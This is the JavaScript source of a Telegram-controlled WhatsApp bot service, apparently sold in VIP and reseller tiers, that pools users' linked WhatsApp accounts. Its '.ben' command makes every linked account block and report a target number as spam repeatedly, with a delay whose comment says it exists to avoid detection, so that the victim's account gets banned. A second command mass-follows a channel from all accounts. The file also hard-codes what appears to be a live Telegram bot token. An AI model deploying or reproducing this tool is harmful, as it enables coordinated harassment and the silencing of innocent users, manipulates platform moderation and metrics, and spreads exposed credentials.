/**
 * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑷𝑹𝑶 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 👑
 * نظام الإدارة الذكية والربط المتقدم - نسخة مخصصة لمنصة Render
 */

const { Telegraf, Markup } = require('telegraf');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    delay
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const express = require('express');

// ==========================================
// 🌐 خادم الويب (لضمان استمرار السيرفر 24/7)
// ==========================================
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('👑 TARZAN PRO SYSTEM IS ACTIVE 👑'));
app.listen(PORT, () => console.log(`🌐 Server active on port ${PORT}`));

// ==========================================
// ⚙️ إعدادات التحكم (بياناتك الخاصة)
// ==========================================
const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
const OWNER_ID = '8794826397'; 
const DB_FILE = './tarzan_master_db.json';

// تهيئة قاعدة البيانات
let db = { config: { mode: 'FREE' }, users: {}, sessions: {} };
if (fs.existsSync(DB_FILE)) {
    try { db = { ...db, ...JSON.parse(fs.readFileSync(DB_FILE)) }; } 
    catch (e) { console.error("⚠️ خطأ في قاعدة البيانات، تم البدء من جديد."); }
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const activeSockets = {}; 
const userStates = {}; 

// ==========================================
// 🔥 محرك الواتساب (النظام الأساسي)
// ==========================================

async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
    const sessionDir = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        // 💻 محاكاة متصفح Microsoft Edge على نظام Windows لضمان القبول
        browser: ["Windows", "Edge", "110.0.1587.41"],
        syncFullHistory: false,
        generateHighQualityLinkPreview: true
    });

    activeSockets[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // 🔑 توليد كود الربط (Pair Code)
    if (phoneNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                if (tgContext) {
                    await tgContext.replyWithHTML(
                        `<b>🔱 تم استخراج كود الربط بنجاح 🔱</b>\n\n` +
                        `🔑 الكود: <code>${code}</code>\n\n` +
                        `⚠️ <b>خطوات الربط الآمن:</b>\n` +
                        `1. توجه إلى تطبيق الواتساب الخاص بك.\n` +
                        `2. الإعدادات > الأجهزة المرتبطة > ربط جهاز.\n` +
                        `3. اختر (الربط برقم الهاتف بدلاً من ذلك).\n` +
                        `4. أدخل الكود أعلاه ليتم تفعيل النظام.`
                    );
                }
            } catch (e) {
                if (tgContext) await tgContext.reply("❌ تعذر إصدار الكود، يرجى التأكد من الرقم والمحاولة لاحقاً.");
            }
        }, 3000);
    }

    // ⚔️ استقبال ومعالجة الأوامر
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();

        // 💀 أمر المعالجة (.ben)
        if (body.startsWith('.ben ')) {
            const target = body.split(' ')[1];
            if (!target) return;
            const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            
            await sock.sendMessage(from, { text: `⚔️ <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮</b> ⚔️\n\n🎯 <b>المستخدم:</b> ${target}\n⚙️ <b>الحالة:</b> جاري إرسال 10 طلبات معالجة من كافة الأنظمة المتصلة...` }, { quoted: msg });

            let totalHits = 0;
            const networkSize = Object.keys(activeSockets).length;

            for (const sId in activeSockets) {
                for (let i = 0; i < 10; i++) {
                    try {
                        await activeSockets[sId].updateBlockStatus(targetJid, 'block');
                        await activeSockets[sId].reportSpam(targetJid);
                        totalHits++;
                        await delay(350); // تأخير ذكي لتجنب كشف النظام
                    } catch (e) {}
                }
            }
            await sock.sendMessage(from, { text: `✅ <b>اكتملت المهمة بنجاح</b>\n\n📈 إجمالي الإبلاغات: ${totalHits}\n🔗 الأنظمة المشاركة: ${networkSize}\n\n<i>تم الانتهاء من معالجة الحساب المستهدف بنجاح.</i>` }, { quoted: msg });
        }

        // 📢 أمر المتابعة (.متابعه)
        if (body.startsWith('.متابعه ') || body.startsWith('.متابعة ')) {
            const link = body.split(' ')[1];
            if (!link || !link.includes('whatsapp.com/channel/')) {
                return sock.sendMessage(from, { text: '⚠️ عذراً، الرابط غير صحيح.' });
            }
            const inviteCode = link.split('channel/')[1].split('/')[0];
            
            await sock.sendMessage(from, { text: `🔄 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑺𝑼𝑷𝑷𝑶𝑹𝑻</b> 🔄\n\n⏳ جاري تفعيل المتابعة من كافة الحسابات...` }, { quoted: msg });

            let count = 0;
            for (const sId in activeSockets) {
                try {
                    const meta = await activeSockets[sId].newsletterMetadata("invite", inviteCode);
                    if (meta?.id) {
                        await activeSockets[sId].newsletterFollow(meta.id);
                        count++;
                        await delay(600);
                    }
                } catch (e) {}
            }
            await sock.sendMessage(from, { text: `✅ <b>اكتمل الدعم الفني</b>\n\n📈 عدد المتابعات الجديدة: ${count}.` }, { quoted: msg });
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode === DisconnectReason.loggedOut) {
                delete activeSockets[sessionId];
                delete db.sessions[sessionId];
                fs.rmSync(sessionDir, { recursive: true, force: true });
                saveDB();
            } else {
                setTimeout(() => startWhatsAppSession(sessionId), 5000);
            }
        } else if (connection === 'open') {
            console.log(`✅ [SYSTEM READY] ID: ${sessionId}`);
            
            if (!db.sessions[sessionId]) db.sessions[sessionId] = {};
            if (!db.sessions[sessionId].welcomeSent) {
                try {
                    const selfId = jidNormalizedUser(sock.user.id);
                    await sock.sendMessage(selfId, { text: `👑 <b>أهلاً بك في نظام 𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶</b> 👑\n\nتم ربط هذا الرقم بالنظام بنجاح.\n\n📝 <b>طريقة الاستخدام:</b>\n- استخدم <code>.ben [الرقم]</code> للمعالجة.\n- استخدم <code>.متابعه [الرابط]</code> للدعم.` });
                    db.sessions[sessionId].welcomeSent = true;
                    saveDB();
                } catch (e) {}
            }
        }
    });
}

// ==========================================
// 📱 لوحة التحكم (Telegram)
// ==========================================
const bot = new Telegraf(TG_TOKEN);

bot.catch((err) => console.error(`[Telegram Error]`, err.message));

bot.start((ctx) => {
    const uid = ctx.from.id.toString();
    const isOwner = uid === OWNER_ID;
    const user = db.users[uid];
    const role = isOwner ? 'OWNER' : (user ? user.role : 'GUEST');

    if (db.config.mode === 'PAID' && role === 'GUEST') {
        return ctx.replyWithHTML("❌ <b>النظام حالياً في وضع VIP</b>\nيرجى مراجعة الموزع للاشتراك.");
    }

    const roleName = { 'OWNER': '👑 المالك الرئيسي', 'RESELLER': '💎 موزع معتمد', 'USER': '👤 عضو VIP', 'GUEST': '🆓 مستخدم عادي' }[role];
    const activeSessionsCount = Object.keys(activeSockets).length;

    let buttons = [
        [Markup.button.callback('🔗 ربط وتفعيل حساب', 'action_pair')],
        [Markup.button.callback('📊 حالة النظام', 'server_status')]
    ];

    if (role === 'OWNER' || role === 'RESELLER') {
        buttons.push([Markup.button.callback('🎫 تفعيل عضوية VIP', 'action_add_vip')]);
    }
    
    if (role === 'OWNER') {
        buttons.push([Markup.button.callback('🎖️ تعيين موزع جديد', 'action_add_reseller')]);
        buttons.push([
            Markup.button.callback(db.config.mode === 'FREE' ? '🟢 الوضع المجاني' : '🔓 تفعيل المجاني', 'mode_free'), 
            Markup.button.callback(db.config.mode === 'PAID' ? '🔴 الوضع المدفوع' : '🔐 تفعيل المدفوع', 'mode_paid')
        ]);
    }

    ctx.replyWithHTML(
        `🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶 𝑺𝒀𝑺𝑻𝑬𝑴</b> 🔱\n\n` +
        `👤 <b>الرتبة:</b> <code>${roleName}</code>\n` +
        `⚙️ <b>الأنظمة النشطة:</b> <code>${activeSessionsCount}</code>\n\n` +
        `<i>يرجى اختيار الإجراء المناسب من الأسفل:</i>`,
        Markup.inlineKeyboard(buttons)
    );
});

bot.action('action_pair', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_PHONE' };
    ctx.replyWithHTML("📱 <b>يرجى إرسال رقم الهاتف المراد ربطه:</b>\n(مثال: 967733...)");
});

bot.action('action_add_vip', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_USER_ID' };
    ctx.replyWithHTML("🎫 <b>أرسل آيدي التلجرام المراد تفعيله:</b>");
});

bot.action('action_add_reseller', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    userStates[ctx.from.id] = { action: 'WAIT_RESELLER_ID' };
    ctx.replyWithHTML("💎 <b>أرسل آيدي الموزع المراد تعيينه:</b>");
});

bot.action('server_status', (ctx) => {
    const activeCount = Object.keys(activeSockets).length;
    ctx.replyWithHTML(
        `📊 <b>تقرير الحالة الفني:</b>\n\n` +
        `🟢 <b>الخادم:</b> مستقر\n` +
        `🟢 <b>الجلسات النشطة:</b> ${activeCount}\n` +
        `🟢 <b>وضع النظام:</b> ${db.config.mode}`
    );
});

bot.action('mode_free', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    db.config.mode = 'FREE'; saveDB();
    ctx.replyWithHTML("🔓 تم تفعيل الوضع المجاني.");
});

bot.action('mode_paid', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    db.config.mode = 'PAID'; saveDB();
    ctx.replyWithHTML("🔐 تم تفعيل الوضع المدفوع.");
});

bot.on('text', async (ctx) => {
    const uid = ctx.from.id;
    const state = userStates[uid];
    if (!state) return;

    const text = ctx.message.text.trim();

    if (state.action === 'WAIT_PHONE') {
        const phone = text.replace(/[^0-9]/g, '');
        if (phone.length < 10) return ctx.replyWithHTML("❌ الرقم غير صحيح.");
        
        ctx.replyWithHTML("⏳ جاري التواصل مع الخادم لاستخراج الكود...");
        const sId = `SESSION_${Date.now()}`;
        db.sessions[sId] = { ownerTgId: uid, phone: phone };
        saveDB();
        
        await startWhatsAppSession(sId, phone, ctx);
        delete userStates[uid];
    } 
    else if (state.action === 'WAIT_USER_ID') {
        db.users[text] = { role: 'USER', addedBy: uid, date: new Date().toISOString() };
        saveDB();
        ctx.replyWithHTML(`✅ تم تفعيل العضوية للآيدي: <code>${text}</code>`);
        delete userStates[userId];
    }
    else if (state.action === 'WAIT_RESELLER_ID') {
        db.users[text] = { role: 'RESELLER', addedBy: uid, date: new Date().toISOString() };
        saveDB();
        ctx.replyWithHTML(`💎 تم تعيين الموزع بنجاح.`);
        delete userStates[uid];
    }
});

// ==========================================
// 🚀 إطلاق النظام
// ==========================================
const init = async () => {
    const sDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sDir)) fs.mkdirSync(sDir);
    
    const folders = fs.readdirSync(sDir).filter(f => fs.lstatSync(path.join(sDir, f)).isDirectory());
    for (const f of folders) {
        try { await startWhatsAppSession(f); await delay(1500); } catch (e) {}
    }
    
    bot.launch();
    console.log("✅ Tarzan Pro System is ready and active.");
};

init();

process.on('uncaughtException', (err) => console.error(err.message));
process.on('unhandledRejection', (err) => console.error(err.message));
